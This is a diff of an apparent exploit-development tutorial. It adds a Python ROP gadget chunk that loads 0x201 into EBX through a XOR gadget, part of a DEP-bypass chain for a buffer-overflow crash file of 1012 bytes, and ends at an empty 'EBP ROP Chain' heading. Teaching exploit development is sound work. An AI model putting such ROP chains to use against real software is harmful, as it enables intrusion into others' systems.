@@ -465,6 +465,12 @@ edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
 edx += struct.pack('<L', 0x10014474)    # a pointer to # ADD EAX,4 # RETN
 edx += struct.pack('<L', 0x10038a6c)    # a pointer to # XCHG EAX,EDX # RETN
 
+# EBX Chunk Affects: EAX, EBX
+ebx = struct.pack('<L', 0x10015fe7) # a pointer to a # POP EAX # RETN
+ebx += struct.pack('<L', 0x994801bc)    # once XOR'd w the static value 994803BD, this will result in 0x201
+ebx += struct.pack('<L', 0x1003a074)    # a pointer to # XOR EAX,994803BD # RETN
+ebx += struct.pack('<L', 0x10032f32)    # a pointer to # XCHG EAX,EBX # RETN 0x00
+
 rop = ""
 
 fuzz = "A" * 1012
@@ -476,3 +482,11 @@ makedafile = open(crash_file, "w")
 makedafile.write(fuzz)
 makedafile.close()
 ```
+
+To the astute reader: now that you've seen the static XOR gadget for EAX, is there a more efficient way we could've approached our EDX chain? 
+
+EBX chain crushed, moving on!
+
+## EBP ROP Chain
+
+
